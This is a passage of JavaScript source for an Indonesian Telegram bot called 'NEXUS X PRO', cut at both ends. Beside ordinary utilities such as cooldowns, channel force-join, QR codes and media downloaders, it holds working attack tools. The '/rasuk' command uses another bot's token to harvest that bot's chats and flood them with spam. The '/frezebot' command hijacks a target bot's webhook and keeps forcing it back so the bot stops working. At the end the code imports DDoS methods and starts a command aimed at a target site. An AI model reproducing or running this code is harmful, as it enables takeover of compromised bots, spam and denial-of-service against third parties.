        const parsed = JSON.parse(raw);
        if (typeof parsed !== 'object' || Array.isArray(parsed)) return {};
        return parsed;
    } catch (e) {
        console.error('[cooldown] load gagal:', e.message);
        return {};
    }
};

const saveCooldowns = () => {
    try {
        fs.ensureDirSync(path.dirname(COOLDOWN_FILE));
        fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(cooldowns, null, 2));
    } catch (e) {
        console.error('[cooldown] save gagal:', e.message);
    }
};

let cooldowns = loadCooldowns();

const cooldownTracker = new Map();

const cooldownMW = (defaultSeconds = 0) => async (ctx, next) => {
    const text = ctx.message?.text || "";
    if (!text.startsWith("/")) return next();

    const cmd = text.split(" ")[0].slice(1).split("@")[0].toLowerCase();
    if (!cmd) return next();

    if (String(ctx.from.id) === String(ID_TELEGRAM)) return next();

    const seconds = Number(cooldowns[cmd] ?? defaultSeconds);
    if (!Number.isFinite(seconds) || seconds <= 0) return next();

    const key = `${ctx.from.id}:${cmd}`;
    const now = Date.now();
    const until = cooldownTracker.get(key) || 0;

    if (now < until) {
        const sisa = Math.ceil((until - now) / 1000);
        return ctx.reply(`⏳ Tυnggυ ${sisa} dєtik sєbєlυm pαkαi /${cmd} lαgi`);
    }

    cooldownTracker.set(key, now + seconds * 1000);
    return next();
};

setInterval(() => {
    const now = Date.now();
    for (const [k, v] of cooldownTracker) {
        if (v <= now) cooldownTracker.delete(k);
    }
}, 60000);

// ─────── COMMAND /setjeda ─────── //
bot.command("setjeda", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const args = ctx.message.text.split(" ").slice(1);
    const cmd = (args[0] || "").replace(/[^a-zA-Z0-9_]/g, "").toLowerCase();
    const sec = parseInt(args[1], 10);

    if (!cmd || !Number.isFinite(sec) || sec < 0) {
        return ctx.reply("🪧 Fσrmαt: /setjeda 10");
    }

    cooldowns[cmd] = sec;
    saveCooldowns();

    if (sec === 0) {
        console.log(`[cooldown] set ${cmd} = 0s (disabled)`);
        return ctx.reply(`✅ Jєdα /${cmd} disєt 0 dєtik (tαnpα jєdα)`);
    }

    console.log(`[cooldown] set ${cmd} = ${sec}s`);
    await ctx.reply(`✅ Jєdα /${cmd} disєt ${sec} dєtik`);
});

// ─────── SETUP FORCE JOIN ─────── //
const CHANNELS_FILE = './assets/channels.json';
const MAX_CHANNEL_SLOTS = 10;
const JOIN_CACHE_MS = 0;

const loadChannels = () => {
    try {
        if (!fs.existsSync(CHANNELS_FILE)) return {};
        const raw = fs.readFileSync(CHANNELS_FILE, 'utf8');
        const parsed = JSON.parse(raw);
        if (typeof parsed !== 'object' || Array.isArray(parsed)) return {};
        return parsed;
    } catch (e) {
        console.error('[channels] load gagal:', e.message);
        return {};
    }
};

const saveChannels = () => {
    try {
        fs.ensureDirSync(path.dirname(CHANNELS_FILE));
        fs.writeFileSync(CHANNELS_FILE, JSON.stringify(channels, null, 2));
    } catch (e) {
        console.error('[channels] save gagal:', e.message);
    }
};

let channels = loadChannels();

const joinCache = new Map();

const getChannelEntries = () => {
    const out = [];
    for (let i = 1; i <= MAX_CHANNEL_SLOTS; i++) {
        const v = channels[String(i)];
        if (v && v.chatId && v.link) out.push({ slot: i, ...v });
    }
    return out;
};

const resolveChannelInput = async (telegram, input) => {
    const s = String(input).trim();
    if (!s) throw new Error('Kosong');

    if (/^-?\d+$/.test(s)) {
        const chat = await telegram.getChat(s);
        return { chatId: String(chat.id), link: chat.invite_link || `https://t.me/c/${String(chat.id).replace('-100', '')}` };
    }

    if (s.startsWith('@')) {
        const chat = await telegram.getChat(s);
        return { chatId: String(chat.id), link: `https://t.me/${s.slice(1)}` };
    }

    let m = s.match(/t\.me\/([a-zA-Z][a-zA-Z0-9_]{3,})/);
    if (m) {
        const chat = await telegram.getChat('@' + m[1]);
        return { chatId: String(chat.id), link: `https://t.me/${m[1]}` };
    }

    m = s.match(/t\.me\/(?:\+|joinchat\/)([a-zA-Z0-9_-]+)/);
    if (m) {
        throw new Error('Link privat (+hash) tidak didukung. Pakai @username atau ID channel');
    }

    throw new Error('Format link tidak dikenali');
};

const checkUserJoined = async (telegram, userId) => {
    const entries = getChannelEntries();
    if (entries.length === 0) return { ok: true, missing: [] };

    const cached = joinCache.get(String(userId));
    const now = Date.now();
    if (cached && now < cached.until) {
        return { ok: cached.ok, missing: cached.missing };
    }

    const missing = [];
    for (const e of entries) {
        try {
            const member = await telegram.getChatMember(e.chatId, userId);
            const status = member?.status;
            if (status === 'left' || status === 'kicked') {
                missing.push(e);
            }
        } catch (err) {
            console.log(`[channels] getChatMember ${e.slot} gagal: ${err.message}`);
            missing.push(e);
        }
    }

    const ok = missing.length === 0;
    joinCache.set(String(userId), { ok, missing, until: now + JOIN_CACHE_MS });
    return { ok, missing };
};

const checkJoin = () => async (ctx, next) => {
    if (String(ctx.from.id) === String(ID_TELEGRAM)) return next();

    const entries = getChannelEntries();
    if (entries.length === 0) return next();

    const res = await checkUserJoined(ctx.telegram, ctx.from.id);
    if (res.ok) return next();

    const buttons = res.missing.map(e => ([
        { text: `📢 JOIN CHANNEL ${e.slot}`, url: e.link }
    ]));
    buttons.push([{ text: "✅ SUDAH JOIN", callback_data: "ch_verify" }]);

    const lines = [];
    lines.push("<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>");
    lines.push("⚠️ Kαmυ hαrυs jσin chαnnєl dυlυ sєbєlυm pαkαi bσt");
    lines.push("");
    for (const e of res.missing) {
        lines.push(`- Slσt ${e.slot}: ${e.link}`);
    }
    lines.push("");
    lines.push("Klik JOIN, lαlυ klik SUDAH JOIN");

    const text = lines.join("\n");

    try {
        return ctx.reply(text, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons },
            disable_web_page_preview: true,
        });
    } catch (e) {
        return ctx.reply(text.replace(/<[^>]+>/g, ""), {
            reply_markup: { inline_keyboard: buttons },
            disable_web_page_preview: true,
        });
    }
};

bot.action("ch_verify", async (ctx) => {
    joinCache.delete(String(ctx.from.id));
    const res = await checkUserJoined(ctx.telegram, ctx.from.id);

    if (res.ok) {
        await ctx.answerCbQuery("✅ Vєrifikαsi bєrhαsil");
        try {
            await ctx.deleteMessage();
        } catch (e) {}
        return ctx.reply("✅ Aksєs dibυkα, Sєlαmαt mєnggυnαkαn");
    }

    await ctx.answerCbQuery(`❌ Mαsih αdα ${res.missing.length} chαnnєl yαng bєlυm dijσin`, { show_alert: true });
});

// ─────── COMMAND /setch ─────── //
bot.command("setch", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const args = ctx.message.text.split(" ").slice(1);
    const slot = parseInt(args[0], 10);
    const input = args[1] || "";

    if (!Number.isFinite(slot) || slot < 1 || slot > MAX_CHANNEL_SLOTS || !input) {
        return ctx.reply("🪧 Fσrmαt: /setch 1 https://t.me/xxxxzz");
    }

    try {
        const resolved = await resolveChannelInput(ctx.telegram, input);
        channels[String(slot)] = resolved;
        saveChannels();
        console.log(`[channels] set slot ${slot}: ${resolved.chatId} (${resolved.link})`);
        await ctx.reply(`✅ Slσt ${slot} disimpαn\nID: ${resolved.chatId}\nLink: ${resolved.link}`);
    } catch (e) {
        await ctx.reply(`❌ Gαgαl: ${e.message}`);
    }
});

// ─────── COMMAND /delch ─────── //
bot.command("delch", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const slot = parseInt((ctx.message.text.split(" ")[1] || ""), 10);

    if (!Number.isFinite(slot) || slot < 1 || slot > MAX_CHANNEL_SLOTS) {
        return ctx.reply("🪧 Cσntσh: /delch 1");
    }

    if (!channels[String(slot)]) {
        return ctx.reply(`🪧 Slσt ${slot} kσsσng`);
    }

    delete channels[String(slot)];
    saveChannels();
    console.log(`[channels] del slot ${slot}`);
    await ctx.reply(`🗑️ Slσt ${slot} dihαpυs`);
});

// ─────── RASUK (BOT SPAM) ─────── //
let rasukActive = false;
const RASUK_DELAY_MS = 300;

const rasukParseToken = (raw) => {
    const m = String(raw).trim().match(/^\d{6,}:[A-Za-z0-9_\-]{30,}$/);
    return m ? m[0] : null;
};

const rasukGetMe = async (token) => {
    try {
        const r = await axios.get(`https://api.telegram.org/bot${token}/getMe`, { timeout: 10000 });
        return r.data.ok ? r.data.result : null;
    } catch (e) {
        return null;
    }
};

const rasukClearWebhook = async (token) => {
    try {
        await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=false`, { timeout: 10000 });
    } catch (e) {}
};

const rasukGetChats = async (token) => {
    try {
        const r = await axios.get(`https://api.telegram.org/bot${token}/getUpdates?limit=100&timeout=0`, { timeout: 15000 });
        if (!r.data.ok) return null;
        const set = new Set();
        for (const u of r.data.result) {
            const c = u.message?.chat?.id
                || u.edited_message?.chat?.id
                || u.channel_post?.chat?.id
                || u.my_chat_member?.chat?.id
                || u.callback_query?.message?.chat?.id;
            if (c) set.add(c);
        }
        return [...set];
    } catch (e) {
        return null;
    }
};

const rasukSend = async (token, chatId, text) => {
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: text
        }, { timeout: 10000 });
        return { ok: true };
    } catch (e) {
        const status = e.response?.status;
        const data = e.response?.data;
        if (status === 429) {
            const wait = (data?.parameters?.retry_after || 1) * 1000;
            await sleep(wait);
            return { ok: false, retry: true };
        }
        if (status === 403 || status === 400) {
            return { ok: false, dead: true, reason: data?.description || "blocked" };
        }
        return { ok: false, reason: e.message };
    }
};

const rasukLoop = async (token, botInfo, initialChats, message) => {
    const alive = new Set(initialChats);
    let sent = 0;
    let dead = 0;
    let errors = 0;

    while (rasukActive) {
        const batch = [...alive];
        for (const chatId of batch) {
            if (!rasukActive) break;
            const res = await rasukSend(token, chatId, message);
            if (res.ok) {
                sent++;
            } else if (res.dead) {
                alive.delete(chatId);
                dead++;
            } else if (res.retry) {
            } else {
                errors++;
            }
            await sleep(RASUK_DELAY_MS);
        }

        if (alive.size === 0) {
            console.log(`[rasuk] @${botInfo.username} no alive chats, stopping`);
            break;
        }
    }

    return { sent, dead, errors, alive: alive.size };
};

// ─────── COMMAND /rasuk ─────── //
bot.command("rasuk", checkJoin(), async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (rasukActive) {
        return ctx.reply("⚠️ Rαsυk sєdαng bєrjαlαn, /rasukstop dυlυ");
    }

    const raw = ctx.message.text.replace(/^\/rasuk(@\S+)?\s*/i, "").trim();
    const sep = raw.indexOf("|");
    if (sep === -1) {
        return ctx.reply("🪧 Fσrmαt: /rasuk <tσkєn> | <pєsαn>");
    }

    const tokenRaw = raw.slice(0, sep).trim();
    const message = raw.slice(sep + 1).trim();

    const token = rasukParseToken(tokenRaw);
    if (!token) {
        return ctx.reply("❌ Tσkєn tidαk vαlid. Fσrmαt: 1234567890:AAA-xxxx");
    }
    if (!message) {
        return ctx.reply("❌ Pєsαn kσsσng");
    }
    if (message.length > 4000) {
        return ctx.reply("❌ Pєsαn mαksimαl 4000 kαrαktєr");
    }

    const botInfo = await rasukGetMe(token);
    if (!botInfo) {
        return ctx.reply("❌ Tσkєn tidαk vαlid αtαυ bσt mαti");
    }

    await rasukClearWebhook(token);
    await sleep(1500);

    const chats = await rasukGetChats(token);
    if (!chats || chats.length === 0) {
        return ctx.reply(`⚠️ Bσt @${botInfo.username} bєlυm pυnyα chαt tєrsimpαn`);
    }

    rasukActive = true;

    const startMsg = await ctx.reply(
        `🔥 Rαsυk αktif\n\n↯ Bσt: @${botInfo.username}\n↯ Tαrgєt: ${chats.length} chαt\n↯ Dєlαy: ${RASUK_DELAY_MS}ms\n\n/rasukstop υntυk bєrhєnti`,
        { parse_mode: "HTML" }
    );

    console.log(`[rasuk] start @${botInfo.username} chats=${chats.length}`);

    rasukLoop(token, botInfo, chats, message)
        .then(async (res) => {
            rasukActive = false;
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                startMsg.message_id,
                undefined,
                `🛑 Rαsυk sєlєsαi\n\n↯ Bσt: @${botInfo.username}\n↯ Tєrkirim: ${res.sent}\n↯ Mαti/blσkir: ${res.dead}\n↯ Єrrσr: ${res.errors}\n↯ Chαt αktif: ${res.alive}`,
                { parse_mode: "HTML" }
            ).catch(() => {});
        })
        .catch((e) => {
            rasukActive = false;
            console.error("[rasuk]", e.message);
            ctx.reply(`❌ Єrrσr: ${e.message}`).catch(() => {});
        });
});

// ─────── COMMAND /rasukstop ─────── //
bot.command("rasukstop", checkJoin(), async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (!rasukActive) {
        return ctx.reply("🪧 Rαsυk tidαk sєdαng bєrjαlαn");
    }
    rasukActive = false;
    await ctx.reply("🛑 Stσp sinyαl dikirim, mєnυnggυ bαtch sєlєsαi...");
});

// ─────── FREEZE (blokir /start bot target) ─────── //
let freezeRunning = false;
const freezeTargets = new Map();
const FREEZE_WEBHOOK_URL = "https://httpbin.org/status/200";

// ─────── COMMAND /frezebot ─────── //
bot.command("frezebot", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (freezeRunning) {
        return ctx.reply("⚠️ Frєєzє αktif, /unfreeze dυlυ");
    }

    const raw = ctx.message.text.replace(/^\/frezebot(@\S+)?\s*/i, "").trim();
    const tokens = raw.split(",").map(s => s.trim()).filter(s => /^\d{6,}:[A-Za-z0-9_\-]{30,}$/.test(s));

    if (tokens.length === 0) {
        return ctx.reply("🪧 Fσrmαt: /frezebot <tσkєn>");
    }

    const valid = [];
    for (const t of tokens) {
        try {
            const r = await axios.get(`https://api.telegram.org/bot${t}/getMe`, { timeout: 5000 });
            if (r.data?.ok) valid.push({ token: t, info: r.data.result });
        } catch (e) {}
    }

    if (valid.length === 0) {
        return ctx.reply("❌ Sєmυα tσkєn tidαk vαlid αtαυ bσt mαti");
    }

    freezeRunning = true;

    const results = [];
    for (const v of valid) {
        try {
            const r = await axios.get(
                `https://api.telegram.org/bot${v.token}/setWebhook?url=${encodeURIComponent(FREEZE_WEBHOOK_URL)}&drop_pending_updates=false`,
                { timeout: 10000 }
            );
            if (r.data?.ok) {
                freezeTargets.set(v.token, { botInfo: v.info, stopped: false });
                results.push(`✅ @${v.info.username} dibєkυkαn`);
                console.log(`[freeze] @${v.info.username} webhook -> ${FREEZE_WEBHOOK_URL}`);
            } else {
                results.push(`❌ @${v.info.username}: ${r.data?.description || "gagal"}`);
            }
        } catch (e) {
            results.push(`❌ @${v.info.username}: ${e.message}`);
        }
    }

    const lines = [];
    lines.push("<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>");
    lines.push("🧊 Frєєzє αktif");
    lines.push("");
    lines.push(...results);
    lines.push("");
    lines.push("/unfreeze υntυk bєrhєnti");

    await ctx.reply(lines.join("\n"), { parse_mode: "HTML" });

    const monitor = setInterval(async () => {
        if (!freezeRunning) {
            clearInterval(monitor);
            return;
        }
        for (const [token, st] of freezeTargets) {
            if (st.stopped) continue;
            try {
                const r = await axios.get(`https://api.telegram.org/bot${token}/getWebhookInfo`, { timeout: 5000 });
                const url = r.data?.result?.url || "";
                if (url !== FREEZE_WEBHOOK_URL) {
                    await axios.get(
                        `https://api.telegram.org/bot${token}/setWebhook?url=${encodeURIComponent(FREEZE_WEBHOOK_URL)}&drop_pending_updates=false`,
                        { timeout: 5000 }
                    ).catch(() => {});
                    console.log(`[freeze] @${st.botInfo.username} webhook dipaksa balik`);
                }
            } catch (e) {}
        }
    }, 15000);
});

// ─────── COMMAND /unfreze ─────── //
bot.command("unfreze", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    if (!freezeRunning) {
        return ctx.reply("🪧 Frєєzє tidαk αktif");
    }
    freezeRunning = false;

    const lines = [];
    lines.push("<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>");
    lines.push("🛑 Frєєzє dihєntikαn");
    lines.push("");

    for (const [token, st] of freezeTargets) {
        st.stopped = true;
        try {
            await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=false`, { timeout: 5000 });
            lines.push(`🔓 @${st.botInfo.username} dibυkα`);
            console.log(`[freeze] @${st.botInfo.username} webhook dihapus`);
        } catch (e) {
            lines.push(`❌ @${st.botInfo.username}: ${e.message}`);
        }
    }

    freezeTargets.clear();
    lines.push("");
    lines.push("Bσt tαrgєt pυlιh kαlαυ tυkαngαn sєt wєbhσσk bαrυ");

    await ctx.reply(lines.join("\n"), { parse_mode: "HTML" });
});

// ─────── COMMAND /ping ─────── //
bot.command("ping", checkJoin(), async (ctx) => {
    const start = Date.now();
    const msg = await ctx.reply("⏳ Ping...");
    
    await ctx.telegram.editMessageText(
        ctx.chat.id, 
        msg.message_id, 
        undefined, 
        `🏓 Pσng!\n⌑ Lαtєnsi: ${Date.now() - start} ms`
    );
});

// ─────── COMMAND /qr ─────── //
bot.command("qr", checkJoin(), async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    
    if (!text) {
        return ctx.reply("🪧 Cσntσh: /qr hαlσ");
    }

    try {
        const buf = await QRCode.toBuffer(text, { width: 500 });
        await ctx.replyWithPhoto(
            { source: buf }, 
            { caption: `𝐐𝐑 𝐂𝐎𝐃𝐄\n⌑ ${text}` }
        );
    } catch (e) {
        ctx.reply("❌ Gαgαl buαt QR");
    }
});

// ─────── COMMAND /b64 ─────── //
bot.command("b64", checkJoin(), async (ctx) => {
    const args = ctx.message.text.split(" ");
    const mode = args[1];
    const text = args.slice(2).join(" ");
    
    if (!mode || !text) {
        return ctx.reply("🪧 /b64 encode <tєks>\n/b64 decode <tєks>");
    }

    try {
        const res = mode === "encode" 
            ? Buffer.from(text).toString('base64') 
            : Buffer.from(text, 'base64').toString('utf8');
            
        ctx.reply(`𝐑𝐄𝐒𝐔𝐋𝐓:\n<code>${res}</code>`, { parse_mode: "HTML" });
    } catch (e) {
        ctx.reply("❌ Gαgαl, cєk fσrmαt");
    }
});

// ─────── COMMAND /ipinfo ─────── //
bot.command("ipinfo", checkJoin(), async (ctx) => {
    const ip = ctx.message.text.split(" ")[1];
    
    if (!ip) {
        return ctx.reply("🪧 Cσntσh: /ipinfo 8.8.8.8");
    }

    const wait = await ctx.reply("⏳ Lσσkυp...");
    
    try {
        const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as,query`);
        
        if (data.status !== 'success') {
            return ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ ${data.message}`);
        }

        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ IP: ${data.query}
⌑ Nєgαrα: ${data.country}
⌑ Kσtα: ${data.city}
⌑ ISP: ${data.isp}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.as || "-"}`;

        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, "❌ Gαgαl trαcking");
    }
});

// ─────── COMMAND /short ─────── //
bot.command("short", checkJoin(), async (ctx) => {
    const url = ctx.message.text.split(" ")[1];
    
    if (!url || !url.startsWith("http")) {
        return ctx.reply("🪧 Cσntσh: /short https://gσσglє.cσm");
    }

    const wait = await ctx.reply("⏳ Mєmpєndєk...");
    
    try {
        const { data } = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Asαl: ${url}
⌑ Hαsil: ${data}`;

        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption);
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, "❌ Gαgαl mєmpєndєk");
    }
});

// ─────── COMMAND /cekweb ─────── //
bot.command("cekweb", checkJoin(), async (ctx) => {
    let domain = ctx.message.text.split(" ")[1];
    
    if (!domain) {
        return ctx.reply("🪧 Cσntσh: /cekweb gσσglє.cσm");
    }
    
    if (!domain.startsWith("http")) {
        domain = "https://" + domain;
    }

    const wait = await ctx.reply("⏳ Cєk wєb...");
    
    try {
        const start = Date.now();
        const { status } = await axios.get(domain, { timeout: 10000 });
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ URL: ${domain}
⌑ Stαtυs: ${status} OK
⌑ Lαtєnsi: ${Date.now() - start} ms`;

        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Wєb dσwn / Errσr: ${e.response?.status || e.message}`);
    }
});

// ─────── COMMAND /password ─────── //
bot.command("password", checkJoin(), async (ctx) => {
    const len = parseInt(ctx.message.text.split(" ")[1]) || 16;
    
    if (len > 64) {
        return ctx.reply("❌ Mαksimαl 64 kαrαktєr");
    }

    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+";
    let pass = "";
    
    for (let i = 0; i < len; i++) {
        pass += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Lєngth: ${len}
⌑ Pαsswσrd:
<code>${pass}</code>`;

    ctx.reply(caption, { parse_mode: "HTML" });
});

// ─────── COMMAND /myip ─────── //
bot.command("myip", checkJoin(), async (ctx) => {
    const wait = await ctx.reply("⏳ Cєk IP...");
    
    try {
        const { data } = await axios.get("https://api.ipify.org?format=json");
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ IP Sєrvєr: <code>${data.ip}</code>`;

        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, "❌ Gαgαl cєk IP");
    }
});

// ─────── COMMAND /fakeuser ─────── //
bot.command("fakeuser", checkJoin(), async (ctx) => {
    const wait = await ctx.reply("⏳ Gєnєrαtє...");
    
    try {
        const { data } = await axios.get("https://randomuser.me/api/");
        const u = data.results[0];
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nαmα: ${u.name.first} ${u.name.last}
⌑ Email: ${u.email}
⌑ Kσtα: ${u.location.city}
⌑ Nєgαrα: ${u.location.country}
⌑ Tєlp: ${u.phone}`;

        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, caption, { parse_mode: "HTML" });
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, "❌ Gαgαl gєnєrαtє");
    }
});

// ─────── COMMAND /tt ─────── //
bot.command("tt", checkJoin(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url.includes("tiktok.com")) return ctx.reply("🪧 Cσntσh: /tt https://vt.tiktok.com/ZS...");

    const wait = await ctx.reply("⏳ Mєngυndυh Tiktσk...");
    try {
        const { data } = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`);
        if (data.code !== 0) throw new Error(data.msg || "Gαgαl mєngαmbil dαtα");
        
        const videoUrl = data.data.play;
        if (!videoUrl) throw new Error("Mєdiα tidαk ditєmυkαn");

        await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ TIKTOK
⌑ Authσr: ${data.data.author?.nickname || "-"}
⌑ Jυdυl: ${data.data.title || "-"}`;

        await ctx.replyWithVideo(videoUrl, { caption, parse_mode: "HTML" });
    } catch (e) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl: ${e.message}`).catch(() => {});
    }
});

// ─────── COMMAND /ig ─────── //
bot.command("ig", checkJoin(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url.includes("instagram.com")) return ctx.reply("🪧 Cσntσh: /ig https://instagram.com/reel/...");

    const wait = await ctx.reply("⏳ Mєngυndυh Instαgrαm...");
    try {
        const { data } = await axios.get(`https://api.nexoracle.com/downloader/ig?url=${encodeURIComponent(url)}`);
        if (!data.status) throw new Error(data.message || "Gαgαl mєngαmbil dαtα");

        const mediaUrl = data.result?.media?.[0]?.url || data.result?.url;
        if (!mediaUrl) throw new Error("Mєdiα tidαk ditєmυkαn");

        await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ INSTAGRAM
⌑ Stαtυs: Bєrhαsil`;

        await ctx.replyWithVideo(mediaUrl, { caption, parse_mode: "HTML" });
    } catch (e) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl: ${e.message}`).catch(() => {});
    }
});

// ─────── COMMAND /fb ─────── //
bot.command("fb", checkJoin(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url.includes("facebook.com") && !url.includes("fb.watch")) return ctx.reply("🪧 Cσntσh: /fb https://facebook.com/watch?v=...");

    const wait = await ctx.reply("⏳ Mєngυndυh Fαcєbσσk...");
    try {
        const { data } = await axios.get(`https://api.nexoracle.com/downloader/fb?url=${encodeURIComponent(url)}`);
        if (!data.status) throw new Error(data.message || "Gαgαl mєngαmbil dαtα");

        const videoUrl = data.result?.hd || data.result?.sd || data.result?.url;
        if (!videoUrl) throw new Error("Mєdiα tidαk ditєmυkαn");

        await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ FACEBOOK
⌑ Stαtυs: Bєrhαsil`;

        await ctx.replyWithVideo(videoUrl, { caption, parse_mode: "HTML" });
    } catch (e) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl: ${e.message}`).catch(() => {});
    }
});

// ─────── COMMAND /yt ─────── //
bot.command("yt", checkJoin(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url.includes("youtube.com") && !url.includes("youtu.be")) return ctx.reply("🪧 Cσntσh: /yt https://youtu.be/...");

    const wait = await ctx.reply("⏳ Mєngυndυh YσυTυbє...");
    try {
        const { data } = await axios.get(`https://api.nexoracle.com/downloader/ytmp4?url=${encodeURIComponent(url)}&quality=720`);
        if (!data.status) throw new Error(data.message || "Gαgαl mєngαmbil dαtα");

        const videoUrl = data.result?.url;
        if (!videoUrl) throw new Error("Mєdiα tidαk ditєmυkαn");

        await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ YOUTUBE
⌑ Jυdυl: ${data.result?.title || "-"}
⌑ Qυαlity: ${data.result?.quality || "720p"}`;

        await ctx.replyWithVideo(videoUrl, { caption, parse_mode: "HTML" });
    } catch (e) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl: ${e.message}`).catch(() => {});
    }
});

// ─────── COMMAND /yta ─────── //
bot.command("yta", checkJoin(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url.includes("youtube.com") && !url.includes("youtu.be")) return ctx.reply("🪧 Cσntσh: /yta https://youtu.be/...");

    const wait = await ctx.reply("⏳ Mєngυndυh YσυTυbє (MP3)...");
    try {
        const { data } = await axios.get(`https://api.nexoracle.com/downloader/ytmp3?url=${encodeURIComponent(url)}`);
        if (!data.status) throw new Error(data.message || "Gαgαl mєngαmbil dαtα");

        const audioUrl = data.result?.url;
        if (!audioUrl) throw new Error("Mєdiα tidαk ditєmυkαn");

        await ctx.telegram.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
        
        const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ YOUTUBE AUDIO
⌑ Jυdυl: ${data.result?.title || "-"}`;

        await ctx.replyWithAudio(audioUrl, { caption, parse_mode: "HTML" });
    } catch (e) {
        await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, `❌ Gαgαl: ${e.message}`).catch(() => {});
    }
});

const ddos = require('./ddos/ddos_methods');
const dns = require('dns').promises;
const activeAttacks = new Map();

// ─────── COMMAND /cekcf ─────── //
bot.command("cekcf", checkBlocked(), checkJoin(), checkAccess(), cooldownMW(), async (ctx) => {
    const url = (ctx.message.text.split(" ")[1] || "").trim();
    if (!url) return ctx.reply("🪧 Cσntσh: /cekcf https://tαrgєt.cσm");

    let domain;
    try {
        domain = new URL(url.startsWith("http") ? url : "http://" + url).hostname;
    } catch (e) {
